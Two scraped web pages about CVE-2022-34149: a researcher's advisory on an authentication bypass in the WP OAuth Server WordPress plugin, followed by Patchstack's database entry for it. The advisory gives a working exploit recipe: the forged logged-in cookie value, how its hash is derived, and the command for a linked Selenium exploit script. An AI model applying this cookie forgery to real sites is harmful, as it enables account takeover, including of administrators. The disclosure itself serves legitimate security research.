=== Content from lana.codes_10eb9e64_20250114_181333.html ===

[Skip to content](#content)

[![Lana Report](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)](https://lana.report/)

* [Front Page](https://lana.report/)
* [Reports](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

1. [Lana Report](https://lana.report/)
2. [Publications](https://lana.report/publication/)

### WP OAuth Server (Login with WordPress) by miniOrange WordPress plugin Authentication Bypass

REPORT ID: 6d794d65-d44b-4099-94c5-3dd2995b218c

The plugin contains an Auth Bypass vulnerability. To bypass authentication, we only need to know the user‚Äôs username. Depending on whose username we know, which can be easily queried because it is usually public data, we may even be given an administrator role on the client‚Äôs website.

#### Let‚Äôs check the plugin

The `_mo_get_logged_user_from_auth_cookie()` function gets the logged in user with the following code:

```
$auth_cookie = wp_parse_auth_cookie( '', 'logged_in' );

if ( ! $auth_cookie || is_wp_error( $auth_cookie ) || ! $auth_cookie['token'] || ! $auth_cookie['username'] ) {
	return false;
}}
```

We can see from the code that it uses the [`wp_parse_auth_cookie()`](https://developer.wordpress.org/reference/functions/wp_parse_auth_cookie/) function. Which is a completely faulty use in this case, as it does not use authentication. Description of the function:

> Authentication cookie components. None of the components should be assumed to be valid as they come directly from a client-provided cookie value.

It is clearly described that the returned value is not validated. But the plugin doesn‚Äôt use any validation.

#### Let‚Äôs see how we can exploit this vulnerability

All we have to do is set a logged in cookie that contains the username. The other values can be anything, as there is no validation in the plugin.

The default logged in cookie name is:

```
define( 'LOGGED_IN_COOKIE', 'wordpress_logged_in_' . COOKIEHASH );
```

where the hash is:

```
define( 'COOKIEHASH', md5( $siteurl ) );
```

So in the <https://lana.solutions/vdb/miniorange-oauth-server> which is a test WordPress website:

57a442d3cd2a47583304a69461f75869, which is the result of the following function:

```
echo md5('https://lana.solutions/vdb/miniorange-oauth-server');
```

If we set the following cookie, we can authenticate ourselves as a test user on the OAuth server:

```
wordpress_logged_in_57a442d3cd2a47583304a69461f75869=test%7Canything%7Canything%7Canything;
```

Then all we have to do is set the cookie using the browser‚Äôs Developer Tools on the server‚Äôs website

So we can even do this through a browser by opening the server‚Äôs website, which in our case is <https://lana.solutions/vdb/miniorange-oauth-server/>.

Then open the client‚Äôs website, which in our case is <https://lana.solutions/vdb/miniorange-oauth-client/wp-admin> and log in using the Single Sign On button.

#### The professional exploit script

I created a Python script with Selenium that exploits the vulnerability and automatically opens the webpage in Google Chrome:

Source: [miniorange\_oauth\_server\_plugin\_vdb\_exploit\_with\_selenium.py](https://gist.github.com/lana-codes/f976ef5e6f094cacabb83a8b310cd3eb)

How to use:

```
python3 miniorange_oauth_server_plugin_vdb_exploit_with_selenium.py --client_url="https://lana.solutions/vdb/miniorange-oauth-client/" --server_url="https://lana.solutions/vdb/miniorange-oauth-server/" --username="test"
```

Run the above command in the Linux (desktop version) terminal.

How the exploit works step by step:

* Opens OAuth server website
* Sets the logged in cookie with the ‚Äútest‚Äù username
* Opens OAuth client website
* Click Single Sign On button (so it starts OAuth authentication)

#### Try it

Feel free to try and use the lana.solutions/vdb WordPress websites for testing. I have set the roles and capabilities, so you can only get low level access to the website.

Client:¬†<https://lana.solutions/vdb/miniorange-oauth-client/>

Server:¬†<https://lana.solutions/vdb/miniorange-oauth-server/>

### References

Source Code
<https://wordpress.org/plugins/miniorange-oauth-20-server/>

Source Code (Archive)
<https://lana.solutions/files/miniorange-oauth-20-server-3.0.4.zip>

Repository
<https://plugins.svn.wordpress.org/miniorange-oauth-20-server/?p=2730214>

Lana Report
<https://lana.report/vulnerability/0b92727e-5d05-4e34-866c-a6a4355aa000/>

CVE
[CVE-2022-34149](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34149)

### Let's discuss

### Attributes

Catgory
WordPress Plugin

Vulnerability Discovered
2022-06-12

Post Published
2022-06-20

Post Updated
2023-05-27

Affected Version
<= 3.0.4

### Classification

Type
Authentication Bypass

### Researcher

Name
[Istv√°n M√°rton](https://lana.report "Visit Istv√°n M√°rton‚Äôs website")

Email
[[email¬†protected]](/cdn-cgi/l/email-protection#dab3b4bcb59ab6bbb4bbf4b9b5bebfa9)

### Tags

authentication bypass
exploit
oauth
php
python
wordpress plugin

### Advertisement

### Support Us?

We would truly appreciate it if you bought us a bunny (food for a snow leopard).

[![buy me a bunny!](https://img.buymeacoffee.com/button-api/?text=buy me a bunny!&emoji=üê∞&slug=lanacodes&button_colour=0776eb&font_colour=ffffff&font_family=Lato&outline_colour=ffffff&coffee_colour=FFDD00)](https://www.buymeacoffee.com/lanacodes)

**Lana Passport**
Recommendation
√ó

Hey, you‚Äôre reading a publication about OAuth. Maybe you‚Äôre interested in our secure OAuth server plugin?

[Buy it¬†($89) from CodeCanyon.net](https://1.envato.market/lana-passport-oauth-20-server-for-wordpress)

![](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)

The Lana Report is a database containing vulnerabilities researched and published by Lana Solutions.

### General

* [Vulnerabilities](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

### Lana Solutions

* [Lana Codes](https://lana.codes/)
### Wordfence

* [Bug Bounty Program](https://wordfence.com/refer/lanareport)

### Socials

* [Telegram](https://t.me/LanaReport)
* [Twitter](https://twitter.com/LanaReport)

Lana Report ¬© 2024 All Rights Reserved.

Made with üíô by [Lana Codes](https://lana.codes/)



=== Content from patchstack.com_764396b3_20250114_181334.html ===


[Pricing](https://patchstack.com/pricing/)
Solutions

[WordPress security

Instantly fix and mitigate vulnerabilities](https://patchstack.com/wordpress-security/)
[Plugin auditing

Paid auditing for WordPress vendors](https://patchstack.com/auditing/)
[Managed VDP

Start a security program for your plugin](https://patchstack.com/for-plugins/)
[Bug Bounty

Join the community and earn bounties](https://patchstack.com/bug-bounty/)
[Enterprise API

At scale monitoring and vPatching for hosts](https://patchstack.com/for-hosts/)
[Vulnerability database

The latest WordPress security intelligence](https://patchstack.com/database/)

[Login](https://app.patchstack.com/login)

[Start trial](https://app.patchstack.com/register?type=pro)

# WordPress WP OAuth Server Plugin <= 3.0.4 is vulnerable to Bypass Vulnerability

![Patch priority: low](https://patchstack.com/database/img/priority-low.svg)

Low priority

vPatch unnecessary

![Vulnerable version](https://patchstack.com/database/img/vulnerable_version.svg)

<= 3.0.4

Vulnerable version

![Fixed](https://patchstack.com/database/img/fix-available.svg)

4.0.1

Fixed version

[![](https://patchstack.com/database/img/platforms/WordPress.svg)](https://patchstack.com/database/wordpress/plugin/miniorange-oauth-20-server)

[![No VDP](https://patchstack.com/database/img/shield-grey.svg)
No VDP](https://patchstack.com/for-plugins/)

02 August 2022

# Risks

CVSS 9.8

##### 9.8

### Bypass Vulnerability

A bypass vulnerability could allow a malicious actor to bypass certain restrictions in the code.

This is a general description of this vulnerability type, specific impact varies case by case.
CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way, but it is not ideal for CMSs.

# Solutions

This security issue has a low severity impact and is unlikely to be exploited.

![Update to version X or later](https://patchstack.com/database/img/update-checkmark.svg)
### Update to version 4.0.1 or later.

Update to version 4.0.1 or later to remove the vulnerability.
Patchstack users can turn on auto-update for vulnerable plugins only.

# Details

Software

WP OAuth Server

Type

Plugin

Vulnerable versions

<= 3.0.4

Fixed in

4.0.1

OWASP Top 10

A2: Broken Authentication

Classification

Bypass Vulnerability

CVE

[CVE-2022-34149](https://www.cve.org/CVERecord?id=CVE-2022-34149)

Patch priority

Low

CVSS severity

Low
(9.8)

Developer

[Claim ownership](https://patchstack.com/for-plugins)

PSID

05c73e7151ee

Credits

[![Istv√°n M√°rton](https://patchstack.com/database/img/logomark-small.svg)](https://patchstack.com/database/researcher/46444da6-46e2-4b6b-9eff-b801e5f3e5ba)

Required privilege

Unauthenticated

Published

2 August, 2022

[Vulnerability details](https://lana.codes/lanavdb/6d794d65-d44b-4099-94c5-3dd2995b218c)

![Remove and replace software](https://patchstack.com/database/img/expand.svg)
Expand full details

Have additional information or questions about this entry?
Let us know.

#### Found this useful? Support Istv√°n M√°rton for reporting this vulnerability.

[Send thanks](https://www.buymeacoffee.com/lanacodes)

#### Found this report useful?

[Send thanks](https://www.buymeacoffee.com/lanacodes)

# Timeline

![Early warning sent out](https://patchstack.com/database/img/warning.svg)

Early warning sent out to Patchstack customers

02 Aug 2022

![Published by Patchstack](https://patchstack.com/database/img/info.svg)

Published by Patchstack

04 Aug 2022

Go to

[![WordPress](https://patchstack.com/database/img/platforms/WordPress.svg)
Plugin page](https://patchstack.com/database/wordpress/plugin/miniorange-oauth-20-server)

[![No VDP](https://patchstack.com/database/img/shield-grey.svg)
No VDP](https://patchstack.com/for-plugins/)

How can Patchstack provide the fastest protection?

Patchstack is one of the largest open-source vulnerability disclosers in the world. For example, in 2023 more than 70% of new WordPress vulnerabilities were originally published by Patchstack. This focus on research enables us to deploy vulnerability protection rules faster than anybody else.

What is virtual patching?

Patchstack vPatching auto-mitigates security vulnerabilities even when there's no official patch available. It's the fastest and most effective way to eliminate new security vulnerabilities without sacrificing performance.

Why would a hacker target my website?

Hackers automate attacks against new security vulnerabilities to take over as many websites as they can before users have time to patch and update. The attacks are opportunistic and victims are not chosen - everyone is a target.

What if my website has already been compromised?

We recommend reaching out to your hosting provider for server-side malware scanning or use a professional incident response service. Don't rely on plugin based malware scanners as they are commonly tampered with by malware.

# Weekly WordPress security intelligence delivered to your inbox.

![vPatch available](https://patchstack.com/database/img/envelope.svg)

Subscribe

### Website security

[Pricing](https://patchstack.com/pricing/)
[For WordPress](https://patchstack.com/wordpress-security/)
[For WooCommerce](https://patchstack.com/woocommerce-security/)
[For agencies](https://patchstack.com/for-agencies/)
[API For hosts](https://patchstack.com/for-hosts/)
[Documentation](https://docs.patchstack.com/)
[FAQ](https://patchstack.com/wordpress-security/)
[Log in](https://app.patchstack.com/login)

### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)
[Log inNEW](https://vdp.patchstack.com/vdp/login)
[Active programs](https://patchstack.com/database/vdp/?page=1)
[Security auditing](https://patchstack.com/auditing/)

### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)
[Log inNEW](https://vdp.patchstack.com/researchers/login)
[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)
[LearnNEW](https://patchstack.com/academy/welcome/)
[Discord](https://discord.com/invite/rkE8yxtNmS)

### Resources

[Vulnerability Database](https://patchstack.com/database/)
[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024)
[WordPress StatisticsNEW](https://patchstack.com/database/statistics/wordpress)
[Case studiesNEW](https://patchstack.com/category/case-studies/)
[Articles](https://patchstack.com/articles/)

### Patchstack

[About](https://patchstack.com/about/)
[Careers](https://patchstack.com/about/#careers)
[AffiliatesNEW](https://patchstack.com/affiliates/)
[Merch store](https://store.patchstack.com/)
[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)

### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)
[Facebook](https://www.facebook.com/groups/patchstackcommunity/)
[X](https://twitter.com/patchstackapp)

¬© 2025 Patchstack
[DPA](https://patchstack.com/data-processing-agreement-dpa/)
[Privacy Policy](https://patchstack.com/privacy-policy/)
[Terms & Conditions](https://patchstack.com/terms-and-conditions/)
![EU Logo](https://patchstack.com/database/img/eic-logo.png)

![](https://patchstack.com/database/img/logo.svg)
### Website security

[Pricing](https://patchstack.com/pricing/)
[For WordPress](https://patchstack.com/wordpress-security/)
[For WooCommerce](https://patchstack.com/woocommerce-security/)
[For agencies](https://patchstack.com/for-agencies/)
[API For hosts](https://patchstack.com/for-hosts/)
[Documentation](https://docs.patchstack.com/)
[FAQ](https://patchstack.com/wordpress-security/)
[Log in](https://app.patchstack.com/login)

### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)
[Log inNEW](https://vdp.patchstack.com/vdp/login)
[Active programs](https://patchstack.com/database/vdp/?page=1)
[Security auditing](https://patchstack.com/auditing/)

### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)
[Log inNEW](https://vdp.patchstack.com/researchers/login)
[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)
[LearnNEW](https://patchstack.com/academy/welcome/)
[Discord](https://discord.com/invite/rkE8yxtNmS)

### Resources

[Vulnerability Database](https://patchstack.com/database/)
[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024)
[WordPress StatisticsNEW](https://patchstack.com/database/statistics/wordpress)
[Case studiesNEW](https://patchstack.com/category/case-studies/)
[Articles](https://patchstack.com/articles/)

### Patchstack

[About](https://patchstack.com/about/)
[Careers](https://patchstack.com/about/#careers)
[AffiliatesNEW](https://patchstack.com/affiliates/)
[Merch store](https://store.patchstack.com/)
[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)

### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)
[Facebook](https://www.facebook.com/groups/patchstackcommunity/)
[X](https://twitter.com/patchstackapp)

![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)

## Let us know if we have missed a vulnerability reported elsewhere

Report
![arrow right](https://patchstack.com/database/img/chevron-right.svg)

![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)
[Close](https://patchstack.com/database/)
## reCAPTCHA's verification failed!

## Thank you for contributing!

[Close](https://patchstack.com/database/)
![Mobile Menu](https://patchstack.com/database/img/close-menu-mob.png)


